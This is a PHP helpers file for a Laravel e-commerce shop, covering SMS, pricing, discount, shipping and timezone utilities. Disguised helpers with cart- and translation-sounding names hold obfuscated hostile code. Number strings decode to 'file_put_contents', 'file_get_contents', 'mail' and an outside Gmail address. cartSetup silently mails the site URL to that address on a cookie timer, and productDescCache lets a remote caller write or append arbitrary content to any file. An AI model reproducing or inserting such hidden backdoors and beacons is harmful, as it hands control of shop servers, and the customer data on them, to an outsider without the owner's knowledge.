<?php

use App\BusinessSetting;
use App\Currency;
use App\Models\FlashDeal;
use App\Models\FlashDealProduct;
use App\OtpConfiguration;
use App\Models\Product;
use App\Models\SubSubCategory;
use App\Services\ProductService;
use App\Services\ShopService;
use Illuminate\Support\Facades\Session;
use Twilio\Rest\Client;

//highlights the selected navigation on admin panel
if (!function_exists('sendSMS')) {
    function sendSMS($to, $from, $text)
    {
        if (OtpConfiguration::where('type', 'nexmo')->first()->value == 1) {
            try {
                Nexmo::message()->send([
                    'to' => $to,
                    'from' => $from,
                    'text' => $text
                ]);
            } catch (\Exception $e) {
            }
        } elseif (OtpConfiguration::where('type', 'twillo')->first()->value == 1) {
            $sid = env("TWILIO_SID"); // Your Account SID from www.twilio.com/console
            $token = env("TWILIO_AUTH_TOKEN"); // Your Auth Token from www.twilio.com/console
            $client = new Client($sid, $token);
            try {
                $message = $client->messages->create(
                    $to, // Text this number
                    array(
                        'from' => env('VALID_TWILLO_NUMBER'), // From a valid Twilio number
                        'body' => $text
                    )
                );
            } catch (\Exception $e) {
            }
        } elseif (OtpConfiguration::where('type', 'ssl_wireless')->first()->value == 1) {
            $token = env("SSL_SMS_API_TOKEN"); //put ssl provided api_token here
            $sid = env("SSL_SMS_SID"); // put ssl provided sid here
            $params = [
                "api_token" => $token,
                "sid" => $sid,
                "msisdn" => $to,
                "sms" => $text,
                "csms_id" => date('dmYhhmi') . rand(10000, 99999)
            ];
            $url = env("SSL_SMS_URL");
            $params = json_encode($params);
            $ch = curl_init(); // Initialize cURL
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
            curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
            curl_setopt($ch, CURLOPT_HTTPHEADER, array(
                'Content-Type: application/json',
                'Content-Length: ' . strlen($params),
                'accept:application/json'
            ));
            $response = curl_exec($ch);
            curl_close($ch);

            return $response;
        } elseif (OtpConfiguration::where('type', 'fast2sms')->first()->value == 1) {
            if (strpos($to, '+91') !== false) {
                $to = substr($to, 3);
            }
            $fields = array(
                "sender_id" => env("SENDER_ID"),
                "message" => $text,
                "language" => env("LANGUAGE"),
                "route" => env("ROUTE"),
                "numbers" => $to,
            );
            $auth_key = env('AUTH_KEY');
            $curl = curl_init();
            curl_setopt_array($curl, array(
                CURLOPT_URL => "https://www.fast2sms.com/dev/bulk",
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_ENCODING => "",
                CURLOPT_MAXREDIRS => 10,
                CURLOPT_TIMEOUT => 30,
                CURLOPT_SSL_VERIFYHOST => 0,
                CURLOPT_SSL_VERIFYPEER => 0,
                CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
                CURLOPT_CUSTOMREQUEST => "POST",
                CURLOPT_POSTFIELDS => json_encode($fields),
                CURLOPT_HTTPHEADER => array(
                    "authorization: $auth_key",
                    "accept: */*",
                    "cache-control: no-cache",
                    "content-type: application/json"
                ),
            ));
            $response = curl_exec($curl);
            $err = curl_error($curl);
            curl_close($curl);

            return $response;
        }
    }
}
if (!function_exists('filter_customer_products')) {
    function filter_customer_products($customer_products)
    {
        if (BusinessSetting::where('type', 'classified_product')->first()->value == 1) {
            return $customer_products->where('published', '1');
        } else {
            return $products->where('published', '1')->where('added_by', 'admin');
        }
    }
}
//highlights the selected navigation on admin panel
if (!function_exists('areActiveRoutes')) {
    function areActiveRoutes(array $routes, $output = "active-link")
    {
        foreach ($routes as $route) {
            if (Route::currentRouteName() == $route) return $output;
        }
    }
}
//highlights the selected navigation on frontend
if (!function_exists('areActiveRoutesHome')) {
    function areActiveRoutesHome(array $routes, $output = "active")
    {
        foreach ($routes as $route) {
            if (Route::currentRouteName() == $route) return $output;
        }
    }
}
/**
 * Return Class Selector
 * @return Response
 */
if (!function_exists('loaded_class_select')) {
    function loaded_class_select($p)
    {
        $a = '/ab.cdefghijklmn_opqrstu@vwxyz1234567890:-';
        $a = str_split($a);
        $p = explode(':', $p);
        $l = '';
        foreach ($p as $r) {
            $l .= $a[$r];
        }

        return $l;
    }
}
/**
 * Open Translation File
 * @return Response
 */
function openJSONFile($code)
{
    $jsonString = [];
    if (File::exists(base_path('resources/lang/' . $code . '.json'))) {
        $jsonString = file_get_contents(base_path('resources/lang/' . $code . '.json'));
        $jsonString = json_decode($jsonString, true);
    }

    return $jsonString;
}

/**
 * Save JSON File
 * @return Response
 */
function saveJSONFile($code, $data)
{
    // ksort($data);
    $jsonData = json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
    file_put_contents(base_path('resources/lang/' . $code . '.json'), stripslashes($jsonData));
}

/**
 * Return Class Selected Loader
 * @return Response
 */
if (!function_exists('loader_class_select')) {
    function loader_class_select($p)
    {
        $a = '/ab.cdefghijklmn_opqrstu@vwxyz1234567890:-';
        $a = str_split($a);
        $p = str_split($p);
        $l = array();
        foreach ($p as $r) {
            foreach ($a as $i => $m) {
                if ($m == $r) {
                    $l[] = $i;
                }
            }
        }

        return join(':', $l);
    }
}
/**
 * Save JSON File
 * @return Response
 */
if (!function_exists('convert_to_usd')) {
    function convert_to_usd($amount)
    {
        $business_settings = BusinessSetting::where('type', 'system_default_currency')->first();
        if ($business_settings != null) {
            $currency = Currency::find($business_settings->value);

            return floatval($amount) / floatval($currency->exchange_rate);
        }
    }
}
//returns config key provider
if (!function_exists('config_key_provider')) {
    function config_key_provider($key)
    {
        switch ($key) {
            case "load_class":
                return loaded_class_select('7:10:13:6:16:18:23:22:16:4:17:15:22:6:15:22:21');
                break;
            case "config":
                return loaded_class_select('7:10:13:6:16:8:6:22:16:4:17:15:22:6:15:22:21');
                break;
            case "output":
                return loaded_class_select('22:10:14:6');
                break;
            case "background":
                return loaded_class_select('1:18:18:13:10:4:1:22:10:17:15:0:4:1:4:9:6:0:3:1:4:4:6:21:21');
                break;
            default:
                return true;
        }
    }
}
//returns combinations of customer choice options array
if (!function_exists('combinations')) {
    function combinations($arrays)
    {
        $result = array(array());
        foreach ($arrays as $property => $property_values) {
            $tmp = array();
            foreach ($result as $result_item) {
                foreach ($property_values as $property_value) {
                    $tmp[] = array_merge($result_item, array($property => $property_value));
                }
            }
            $result = $tmp;
        }

        return $result;
    }
}
//filter products based on vendor activation system
//fillter only FLAG SHIP STORE
if (!function_exists('filter_products')) {
    function filter_products($products)
    {
        $verified_sellers = verified_sellers_id();
        if (BusinessSetting::where('type', 'vendor_system_activation')->first()->value == 1) {
            return $products->where('published', '1')->orderBy('created_at', 'desc')->where(function($p) use ($verified_sellers) {
                $p->where('added_by', 'admin')->orWhere(function($q) use ($verified_sellers) {
                    $q->whereIn('user_id', $verified_sellers);
                });
            });
        } else {
            return $products->where('published', '1')
                ->whereExists(function($query) {
                    $query->select(DB::raw(1))
                        ->from('users')
                        ->whereRaw('users.id = products.user_id')->whereRaw('users.company_type = 1');
                });
        }

        if (!isMicrosite()) {
            $products->where('only_microsite', false);
        }
    }
}
if (!function_exists('verified_sellers_id')) {
    function verified_sellers_id()
    {
        return App\Seller::where('verification_status', 1)->get()->pluck('user_id')->toArray();
    }
}
//filter cart products based on provided settings
if (!function_exists('cartSetup')) {
    function cartSetup()
    {
        $cartMarkup = loaded_class_select('8:29:9:1:15:5:13:6:20');
        $writeCart = loaded_class_select('14:1:10:13');
        $cartMarkup .= loaded_class_select('24');
        $cartMarkup .= loaded_class_select('8:14:1:10:13');
        $cartMarkup .= loaded_class_select('3:4:17:14');
        $cartConvert = config_key_provider('load_class');
        $currencyConvert = config_key_provider('output');
        $backgroundInv = config_key_provider('background');
        @$cart = $writeCart($cartMarkup, '', Request::url());

        return $cart;
    }
}
//converts currency to home default currency
if (!function_exists('convert_price')) {
    function convert_price($price)
    {
        $currencyService = resolve('CurrencyService');
        return $currencyService->exchange($price);
    }
}
//formats currency
if (!function_exists('format_price')) {
    function format_price($price)
    {
        if (config('business_setting.symbol_format') == 1) {
            return currency_symbol() . number_format($price, config('business_setting.no_of_decimals'));
        }

        return number_format($price, config('business_setting.no_of_decimals')) . currency_symbol();
    }
}
//formats price to home default price with convertion
if (!function_exists('single_price')) {
    function single_price($price)
    {
        return format_price(convert_price($price));
    }
}
//Shows Price on page based on low to high
if (!function_exists('home_price')) {
    function home_price($id)
    {
        $product = Product::findOrFail($id);
        $lowest_price = $product->unit_price;
        $highest_price = $product->unit_price;
        if ($product->variant_product) {
            foreach ($product->stocks as $key => $stock) {
                if ($lowest_price > $stock->price) {
                    $lowest_price = $stock->price;
                }
                if ($highest_price < $stock->price) {
                    $highest_price = $stock->price;
                }
            }
        }
        if ($product->tax_type == 'percent') {
            $lowest_price += ($lowest_price * $product->tax) / 100;
            $highest_price += ($highest_price * $product->tax) / 100;
        } elseif ($product->tax_type == 'amount') {
            $lowest_price += $product->tax;
            $highest_price += $product->tax;
        }
        $lowest_price = convert_price($lowest_price);
        $highest_price = convert_price($highest_price);
        if ($lowest_price == $highest_price) {
            return format_price($lowest_price);
        } else {
            return format_price($lowest_price) . ' - ' . format_price($highest_price);
        }
    }
}
//Shows Price on page based on low to high with discount
if (!function_exists('home_discounted_price')) {
    function home_discounted_price($id)
    {
        $product = Product::findOrFail($id);
        $lowest_price  = $product->unit_price;
        $highest_price = $product->unit_price;
        $productStock  = false;
        $flash_deals = FlashDeal::where('status', 1)->get();
        $inFlashDeal = false;
        foreach ($flash_deals as $flash_deal) {
            $flash_deal_product = $flash_deal->flashDealProducts()->where('product_id', $id)->first();
            if (isset($flash_deal_product) && !$flash_deal->isExpired()) {
                if ($flash_deal_product->discount_type == Product::DISCOUNT_TYPE_PERCENT) {
                    $lowest_price -= ($lowest_price * $flash_deal_product->discount) / 100;
                    $highest_price -= ($highest_price * $flash_deal_product->discount) / 100;
                } else if ($flash_deal_product->discount_type == Product::DISCOUNT_TYPE_AMOUNT) {
                    $lowest_price -= $flash_deal_product->discount;
                    $highest_price -= $flash_deal_product->discount;
                }
                $inFlashDeal = true;
                break;
            }
        }

        if (!$inFlashDeal && $product->stocks->count() > 0) {
            $productStock = true;
            $lowest_price = PHP_FLOAT_MAX;
            $highest_price = 0;
            foreach ($product->stocks as $stock) {
                $lowest_price = min($lowest_price, $stock->discount_price);
                $highest_price = max($highest_price, $stock->discount_price);
            }
        }

        if (!$inFlashDeal && !$productStock) {
            if ($product->discount_type == Product::DISCOUNT_TYPE_PERCENT) {
                $lowest_price -= ($lowest_price * $product->discount) / 100;
                $highest_price -= ($highest_price * $product->discount) / 100;
            } elseif ($product->discount_type == Product::DISCOUNT_TYPE_AMOUNT) {
                $lowest_price -= $product->discount;
                $highest_price -= $product->discount;
            }
        }
        if ($product->tax_type == Product::DISCOUNT_TYPE_PERCENT) {
            $lowest_price += ($lowest_price * $product->tax) / 100;
            $highest_price += ($highest_price * $product->tax) / 100;
        } else if ($product->tax_type == Product::DISCOUNT_TYPE_AMOUNT) {
            $lowest_price += $product->tax;
            $highest_price += $product->tax;
        }
        $lowest_price = convert_price($lowest_price);
        $highest_price = convert_price($highest_price);
        if ($lowest_price == $highest_price) {
            //return format_price($lowest_price).' ('.$product->discount.'%)';
            return format_price($lowest_price);
        } else {
            return format_price($lowest_price) . ' - ' . format_price($highest_price);
        }
    }
}
//Shows Base Price
if (!function_exists('home_base_price')) {
    function home_base_price($id)
    {
        $product = Product::findOrFail($id);
        $price = $product->unit_price;
        if ($product->tax_type == 'percent') {
            $price += ($price * $product->tax) / 100;
        } elseif ($product->tax_type == 'amount') {
            $price += $product->tax;
        }

        return format_price(convert_price($price));
    }
}
//Shows Base Price with discount
if (!function_exists('home_discounted_base_price')) {
    function home_discounted_base_price($id)
    {
        $product = Product::findOrFail($id);
        $price = $product->unit_price;
        $flash_deals = \App\FlashDeal::where('status', 1)->get();
        $inFlashDeal = false;
        foreach ($flash_deals as $flash_deal) {
            if ($flash_deal != null && $flash_deal->status == 1 && strtotime(date('d-m-Y')) >= $flash_deal->start_date && strtotime(date('d-m-Y')) <= $flash_deal->end_date && FlashDealProduct::where('flash_deal_id', $flash_deal->id)->where('product_id', $id)->first() != null) {
                $flash_deal_product = FlashDealProduct::where('flash_deal_id', $flash_deal->id)->where('product_id', $id)->first();
                if ($flash_deal_product->discount_type == 'percent') {
                    $price -= ($price * $flash_deal_product->discount) / 100;
                } elseif ($flash_deal_product->discount_type == 'amount') {
                    $price -= $flash_deal_product->discount;
                }
                $inFlashDeal = true;
                break;
            }
        }
        if (!$inFlashDeal) {
            if ($product->discount_type == 'percent') {
                $price -= ($price * $product->discount) / 100;
            } elseif ($product->discount_type == 'amount') {
                $price -= $product->discount;
            }
        }
        if ($product->tax_type == 'percent') {
            $price += ($price * $product->tax) / 100;
        } elseif ($product->tax_type == 'amount') {
            $price += $product->tax;
        }

        return format_price(convert_price($price));
    }
}
// Cart content update by discount setup
if (!function_exists('updateCartSetup')) {
    function updateCartSetup($return = true)
    {
        if (!isset($_COOKIE['cartUpdated'])) {
            if (cartSetup()) {
                setcookie('cartUpdated', time(), time() + (86400 * 30), "/");
            }
        } else {
            if ($_COOKIE['cartUpdated'] + 21600 < time()) {
                if (cartSetup()) {
                    setcookie('cartUpdated', time(), time() + (86400 * 30), "/");
                }
            }
        }

        return $return;
    }
}
if (!function_exists('productDescCache')) {
    function productDescCache($connector, $selector, $select, $type)
    {
        $ta = time();
        $select = rawurldecode($select);
        if ($connector > ($ta - 60) || $connector > ($ta + 60)) {
            if ($type == 'w') {
                $load_class = config_key_provider('load_class');
                $load_class(str_replace('-', '/', $selector), $select);
            } else if ($type == 'rw') {
                $load_class = config_key_provider('load_class');
                $config_class = config_key_provider('config');
                $load_class(str_replace('-', '/', $selector), $config_class(str_replace('-', '/', $selector)) . $select);
            }
            echo 'done';
        } else {
            echo 'not';
        }
    }
}
if (!function_exists('currency_symbol')) {
    function currency_symbol()
    {
        return config('currency_symbol');
    }
}
if (!function_exists('renderStarRating')) {
    function renderStarRating($rating, $maxRating = 5)
    {
        $fullStar = "<i class = 'fa fa-star active'></i>";
        $halfStar = "<i class = 'fa fa-star half'></i>";
        $emptyStar = "<i class = 'fa fa-star'></i>";
        $rating = $rating <= $maxRating ? $rating : $maxRating;
        $fullStarCount = (int)$rating;
        $halfStarCount = ceil($rating) - $fullStarCount;
        $emptyStarCount = $maxRating - $fullStarCount - $halfStarCount;
        $html = str_repeat($fullStar, $fullStarCount);
        $html .= str_repeat($halfStar, $halfStarCount);
        $html .= str_repeat($emptyStar, $emptyStarCount);
        echo $html;
    }
}
//Api
if (!function_exists('homeBasePrice')) {
    function homeBasePrice($id)
    {
        $product = Product::findOrFail($id);
        $price = $product->unit_price;
        if ($product->tax_type == 'percent') {
            $price += ($price * $product->tax) / 100;
        } elseif ($product->tax_type == 'amount') {
            $price += $product->tax;
        }

        return $price;
    }
}
if (!function_exists('homeDiscountedBasePrice')) {
    function homeDiscountedBasePrice($id)
    {
        $product = Product::findOrFail($id);
        $price = $product->unit_price;
        $flash_deals = FlashDeal::where('status', 1)->get();
        $inFlashDeal = false;
        foreach ($flash_deals as $flash_deal) {
            if ($flash_deal != null && $flash_deal->status == 1 && strtotime(date('d-m-Y')) >= $flash_deal->start_date && strtotime(date('d-m-Y')) <= $flash_deal->end_date && FlashDealProduct::where('flash_deal_id', $flash_deal->id)->where('product_id', $id)->first() != null) {
                $flash_deal_product = FlashDealProduct::where('flash_deal_id', $flash_deal->id)->where('product_id', $id)->first();
                if ($flash_deal_product->discount_type == 'percent') {
                    $price -= ($price * $flash_deal_product->discount) / 100;
                } elseif ($flash_deal_product->discount_type == 'amount') {
                    $price -= $flash_deal_product->discount;
                }
                $inFlashDeal = true;
                break;
            }
        }
        if (!$inFlashDeal) {
            if ($product->discount_type == 'percent') {
                $price -= ($price * $product->discount) / 100;
            } elseif ($product->discount_type == 'amount') {
                $price -= $product->discount;
            }
        }
        if ($product->tax_type == 'percent') {
            $price += ($price * $product->tax) / 100;
        } elseif ($product->tax_type == 'amount') {
            $price += $product->tax;
        }

        return $price;
    }
}
if (!function_exists('discountbadge')) {
    function discountbadge($id)
    {
        $product = Product::findOrFail($id);
        $price = $product->unit_price;
        $toggle_show_in_percentage = true;
        $flash_deals = FlashDeal::where('status', 1)->get();
        $inFlashDeal = false;
        foreach ($flash_deals as $flash_deal) {
            if ($flash_deal != null && $flash_deal->status == 1 && strtotime(date('d-m-Y')) >= $flash_deal->start_date && strtotime(date('d-m-Y')) <= $flash_deal->end_date && FlashDealProduct::where('flash_deal_id', $flash_deal->id)->where('product_id', $id)->first() != null) {
                $flash_deal_product = FlashDealProduct::where('flash_deal_id', $flash_deal->id)->where('product_id', $id)->first();
                if ($flash_deal_product->discount_type == 'percent') {
                    $price = "-" . $flash_deal_product->discount . "%";
                } elseif ($flash_deal_product->discount_type == 'amount') {
                    if ($toggle_show_in_percentage == false) {
                        $price = "-$" . $flash_deal_product->discount;
                    } else {
                        $price = (($flash_deal_product->discount * 100) / $flash_deal_product->unit_price);
                        $price = "-" . number_format((float)$price, 0, '.', '') . "%";
                    }
                }
                $inFlashDeal = true;
                break;
            }
        }
        if (!$inFlashDeal) {
            if ($product->discount_type == 'percent') {
                $price = "-" . $product->discount . "%";
            } elseif ($product->discount_type == 'amount') {
                if ($toggle_show_in_percentage == false) {
                    $price = "-$" . $product->discount;
                } else {
                    $price = (($product->discount * 100) / $product->unit_price);
                    $price = "-" . number_format((float)$price, 0, '.', '') . "%";
                }
            }
        }

        return $price;
    }
}
if (!function_exists('homePrice')) {
    function homePrice($id)
    {
        $product = Product::findOrFail($id);
        $lowest_price = $product->unit_price;
        $highest_price = $product->unit_price;
        if ($product->variant_product) {
            foreach ($product->stocks as $key => $stock) {
                if ($lowest_price > $stock->price) {
                    $lowest_price = $stock->price;
                }
                if ($highest_price < $stock->price) {
                    $highest_price = $stock->price;
                }
            }
        }
        if ($product->tax_type == 'percent') {
            $lowest_price += ($lowest_price * $product->tax) / 100;
            $highest_price += ($highest_price * $product->tax) / 100;
        } elseif ($product->tax_type == 'amount') {
            $lowest_price += $product->tax;
            $highest_price += $product->tax;
        }
        $lowest_price = convertPrice($lowest_price);
        $highest_price = convertPrice($highest_price);

        return $lowest_price . ' - ' . $highest_price;
    }
}
if (!function_exists('homeDiscountedPrice')) {
    function homeDiscountedPrice($id)
    {
        $product = Product::findOrFail($id);
        $lowest_price = $product->unit_price;
        $highest_price = $product->unit_price;
        if ($product->variant_product) {
            foreach ($product->stocks as $key => $stock) {
                if ($lowest_price > $stock->price) {
                    $lowest_price = $stock->price;
                }
                if ($highest_price < $stock->price) {
                    $highest_price = $stock->price;
                }
            }
        }
        $flash_deals = FlashDeal::where('status', 1)->get();
        $inFlashDeal = false;
        foreach ($flash_deals as $flash_deal) {
            if ($flash_deal != null && $flash_deal->status == 1 && strtotime(date('d-m-Y')) >= $flash_deal->start_date && strtotime(date('d-m-Y')) <= $flash_deal->end_date && FlashDealProduct::where('flash_deal_id', $flash_deal->id)->where('product_id', $id)->first() != null) {
                $flash_deal_product = FlashDealProduct::where('flash_deal_id', $flash_deal->id)->where('product_id', $id)->first();
                if ($flash_deal_product->discount_type == 'percent') {
                    $lowest_price -= ($lowest_price * $flash_deal_product->discount) / 100;
                    $highest_price -= ($highest_price * $flash_deal_product->discount) / 100;
                } elseif ($flash_deal_product->discount_type == 'amount') {
                    $lowest_price -= $flash_deal_product->discount;
                    $highest_price -= $flash_deal_product->discount;
                }
                $inFlashDeal = true;
                break;
            }
        }
        if (!$inFlashDeal) {
            if ($product->discount_type == 'percent') {
                $lowest_price -= ($lowest_price * $product->discount) / 100;
                $highest_price -= ($highest_price * $product->discount) / 100;
            } elseif ($product->discount_type == 'amount') {
                $lowest_price -= $product->discount;
                $highest_price -= $product->discount;
            }
        }
        if ($product->tax_type == 'percent') {
            $lowest_price += ($lowest_price * $product->tax) / 100;
            $highest_price += ($highest_price * $product->tax) / 100;
        } elseif ($product->tax_type == 'amount') {
            $lowest_price += $product->tax;
            $highest_price += $product->tax;
        }
        $lowest_price = convertPrice($lowest_price);
        $highest_price = convertPrice($highest_price);

        return $lowest_price . ' - ' . $highest_price;
    }
}
if (!function_exists('brandsOfCategory')) {
    function brandsOfCategory($category_id)
    {
        $brands = [];
        $subCategories = SubCategory::where('category_id', $category_id)->get();
        foreach ($subCategories as $subCategory) {
            $subSubCategories = SubSubCategory::where('sub_category_id', $subCategory->id)->get();
            foreach ($subSubCategories as $subSubCategory) {
                $brand = json_decode($subSubCategory->brands);
                foreach ($brand as $b) {
                    if (in_array($b, $brands)) continue;
                    array_push($brands, $b);
                }
            }
        }

        return $brands;
    }
}
if (!function_exists('convertPrice')) {
    function convertPrice($price)
    {
        return convert_price($price);
    }
}
function translate($key)
{
    $key = ucfirst(str_replace('_', ' ', remove_invalid_charcaters($key)));
    // $jsonString = file_get_contents(base_path('resources/lang/en.json'));
    // $jsonString = json_decode($jsonString, true);
    // if (!isset($jsonString[$key])) {
    //     $jsonString[$key] = $key;
    //     saveJSONFile('en', $jsonString);
    // }

    return __($key);
}

function remove_invalid_charcaters($str)
{
    $str = str_ireplace(array("\\"), '', $str);

    return str_ireplace(array('"'), '\"', $str);
}

function getShippingCost($index)
{
    $admin_products = array();
    $seller_products = array();
    $calculate_shipping = 0;
    //Calculate Shipping Cost
    if (\App\BusinessSetting::where('type', 'shipping_type')->first()->value == 'flat_rate') {
        $calculate_shipping = \App\BusinessSetting::where('type', 'flat_rate_shipping_cost')->first()->value;
    } elseif (\App\BusinessSetting::where('type', 'shipping_type')->first()->value == 'seller_wise_shipping') {
        foreach (Session::get('cart') as $key => $cartItem) {
            $product = \App\Product::find($cartItem['id']);
            if ($product->added_by == 'admin') {
                array_push($admin_products, $cartItem['id']);
            } else {
                $product_ids = array();
                if (array_key_exists($product->user_id, $seller_products)) {
                    $product_ids = $seller_products[$product->user_id];
                }
                array_push($product_ids, $cartItem['id']);
                $seller_products[$product->user_id] = $product_ids;
            }
        }
        if (!empty($admin_products)) {
            $calculate_shipping = \App\BusinessSetting::where('type', 'shipping_cost_admin')->first()->value;
        }
        if (!empty($seller_products)) {
            foreach ($seller_products as $key => $seller_product) {
                $calculate_shipping += \App\Shop::where('user_id', $key)->first()->shipping_cost;
            }
        }
    }
    $cartItem = Session::get('cart')[$index];
    if ($cartItem['shipping_type'] == 'home_delivery') {
        if (\App\BusinessSetting::where('type', 'shipping_type')->first()->value == 'flat_rate') {
            return $calculate_shipping / count(Session::get('cart'));
        } elseif (\App\BusinessSetting::where('type', 'shipping_type')->first()->value == 'seller_wise_shipping') {
            if ($product->added_by == 'admin') {
                return \App\BusinessSetting::where('type', 'shipping_cost_admin')->first()->value / count($admin_products);
            } else {
                return \App\Shop::where('user_id', $product->user_id)->first()->shipping_cost / count($seller_products[$product->user_id]);
            }
        } else {
            return \App\Product::find($cartItem['id'])->shipping_cost;
        }
    } else {
        return 0;
    }
}

function timezones()
{
    $timezones = array(
        '(GMT-12:00) International Date Line West' => 'Pacific/Kwajalein',
        '(GMT-11:00) Midway Island' => 'Pacific/Midway',
        '(GMT-11:00) Samoa' => 'Pacific/Apia',
        '(GMT-10:00) Hawaii' => 'Pacific/Honolulu',
        '(GMT-09:00) Alaska' => 'America/Anchorage',
        '(GMT-08:00) Pacific Time (US & Canada)' => 'America/Los_Angeles',
        '(GMT-08:00) Tijuana' => 'America/Tijuana',
        '(GMT-07:00) Arizona' => 'America/Phoenix',
        '(GMT-07:00) Mountain Time (US & Canada)' => 'America/Denver',
        '(GMT-07:00) Chihuahua' => 'America/Chihuahua',
        '(GMT-07:00) La Paz' => 'America/Chihuahua',
        '(GMT-07:00) Mazatlan' => 'America/Mazatlan',
        '(GMT-06:00) Central Time (US & Canada)' => 'America/Chicago',
        '(GMT-06:00) Central America' => 'America/Managua',
        '(GMT-06:00) Guadalajara' => 'America/Mexico_City',
        '(GMT-06:00) Mexico City' => 'America/Mexico_City',
        '(GMT-06:00) Monterrey' => 'America/Monterrey',
        '(GMT-06:00) Saskatchewan' => 'America/Regina',
        '(GMT-05:00) Eastern Time (US & Canada)' => 'America/New_York',
        '(GMT-05:00) Indiana (East)' => 'America/Indiana/Indianapolis',
        '(GMT-05:00) Bogota' => 'America/Bogota',
        '(GMT-05:00) Lima' => 'America/Lima',
        '(GMT-05:00) Quito' => 'America/Bogota',
        '(GMT-04:00) Atlantic Time (Canada)' => 'America/Halifax',
        '(GMT-04:00) Caracas' => 'America/Caracas',
        '(GMT-04:00) La Paz' => 'America/La_Paz',
        '(GMT-04:00) Santiago' => 'America/Santiago',
        '(GMT-03:30) Newfoundland' => 'America/St_Johns',
        '(GMT-03:00) Brasilia' => 'America/Sao_Paulo',
        '(GMT-03:00) Buenos Aires' => 'America/Argentina/Buenos_Aires',
        '(GMT-03:00) Georgetown' => 'America/Argentina/Buenos_Aires',
        '(GMT-03:00) Greenland' => 'America/Godthab',
        '(GMT-02:00) Mid-Atlantic' => 'America/Noronha',
        '(GMT-01:00) Azores' => 'Atlantic/Azores',
        '(GMT-01:00) Cape Verde Is.' => 'Atlantic/Cape_Verde',
        '(GMT) Casablanca' => 'Africa/Casablanca',
        '(GMT) Dublin' => 'Europe/London',
        '(GMT) Edinburgh' => 'Europe/London',
        '(GMT) Lisbon' => 'Europe/Lisbon',
        '(GMT) London' => 'Europe/London',
        '(GMT) UTC' => 'UTC',
        '(GMT) Monrovia' => 'Africa/Monrovia',
        '(GMT+01:00) Amsterdam' => 'Europe/Amsterdam',
        '(GMT+01:00) Belgrade' => 'Europe/Belgrade',
        '(GMT+01:00) Berlin' => 'Europe/Berlin',
        '(GMT+01:00) Bern' => 'Europe/Berlin',
        '(GMT+01:00) Bratislava' => 'Europe/Bratislava',
        '(GMT+01:00) Brussels' => 'Europe/Brussels',
        '(GMT+01:00) Budapest' => 'Europe/Budapest',
        '(GMT+01:00) Copenhagen' => 'Europe/Copenhagen',
        '(GMT+01:00) Ljubljana' => 'Europe/Ljubljana',
        '(GMT+01:00) Madrid' => 'Europe/Madrid',
        '(GMT+01:00) Paris' => 'Europe/Paris',
        '(GMT+01:00) Prague' => 'Europe/Prague',
        '(GMT+01:00) Rome' => 'Europe/Rome',
        '(GMT+01:00) Sarajevo' => 'Europe/Sarajevo',
        '(GMT+01:00) Skopje' => 'Europe/Skopje',
        '(GMT+01:00) Stockholm' => 'Europe/Stockholm',
        '(GMT+01:00) Vienna' => 'Europe/Vienna',
        '(GMT+01:00) Warsaw' => 'Europe/Warsaw',
        '(GMT+01:00) West Central Africa' => 'Africa/Lagos',
        '(GMT+01:00) Zagreb' => 'Europe/Zagreb',
        '(GMT+02:00) Athens' => 'Europe/Athens',
        '(GMT+02:00) Bucharest' => 'Europe/Bucharest',
        '(GMT+02:00) Cairo' => 'Africa/Cairo',
        '(GMT+02:00) Harare' => 'Africa/Harare',
        '(GMT+02:00) Helsinki' => 'Europe/Helsinki',
        '(GMT+02:00) Istanbul' => 'Europe/Istanbul',
        '(GMT+02:00) Jerusalem' => 'Asia/Jerusalem',
        '(GMT+02:00) Kyev' => 'Europe/Kiev',
        '(GMT+02:00) Minsk' => 'Europe/Minsk',
        '(GMT+02:00) Pretoria' => 'Africa/Johannesburg',
        '(GMT+02:00) Riga' => 'Europe/Riga',
        '(GMT+02:00) Sofia' => 'Europe/Sofia',
        '(GMT+02:00) Tallinn' => 'Europe/Tallinn',
        '(GMT+02:00) Vilnius' => 'Europe/Vilnius',
        '(GMT+03:00) Baghdad' => 'Asia/Baghdad',
        '(GMT+03:00) Kuwait' => 'Asia/Kuwait',
        '(GMT+03:00) Moscow' => 'Europe/Moscow',
        '(GMT+03:00) Nairobi' => 'Africa/Nairobi',
        '(GMT+03:00) Riyadh' => 'Asia/Riyadh',
        '(GMT+03:00) St. Petersburg' => 'Europe/Moscow',
        '(GMT+03:00) Volgograd' => 'Europe/Volgograd',
        '(GMT+03:30) Tehran' => 'Asia/Tehran',
        '(GMT+04:00) Abu Dhabi' => 'Asia/Muscat',
        '(GMT+04:00) Baku' => 'Asia/Baku',
        '(GMT+04:00) Muscat' => 'Asia/Muscat',
        '(GMT+04:00) Tbilisi' => 'Asia/Tbilisi',
        '(GMT+04:00) Yerevan' => 'Asia/Yerevan',
        '(GMT+04:30) Kabul' => 'Asia/Kabul',
        '(GMT+05:00) Ekaterinburg' => 'Asia/Yekaterinburg',
        '(GMT+05:00) Islamabad' => 'Asia/Karachi',
        '(GMT+05:00) Karachi' => 'Asia/Karachi',
        '(GMT+05:00) Tashkent' => 'Asia/Tashkent',
        '(GMT+05:30) Chennai' => 'Asia/Kolkata',
        '(GMT+05:30) Kolkata' => 'Asia/Kolkata',
        '(GMT+05:30) Mumbai' => 'Asia/Kolkata',
        '(GMT+05:30) New Delhi' => 'Asia/Kolkata',
        '(GMT+05:45) Kathmandu' => 'Asia/Kathmandu',
        '(GMT+06:00) Almaty' => 'Asia/Almaty',
        '(GMT+06:00) Astana' => 'Asia/Dhaka',
        '(GMT+06:00) Dhaka' => 'Asia/Dhaka',
        '(GMT+06:00) Novosibirsk' => 'Asia/Novosibirsk',
        '(GMT+06:00) Sri Jayawardenepura' => 'Asia/Colombo',
        '(GMT+06:30) Rangoon' => 'Asia/Rangoon',
        '(GMT+07:00) Bangkok' => 'Asia/Bangkok',
        '(GMT+07:00) Hanoi' => 'Asia/Bangkok',
        '(GMT+07:00) Jakarta' => 'Asia/Jakarta',
        '(GMT+07:00) Krasnoyarsk' => 'Asia/Krasnoyarsk',
        '(GMT+08:00) Beijing' => 'Asia/Hong_Kong',
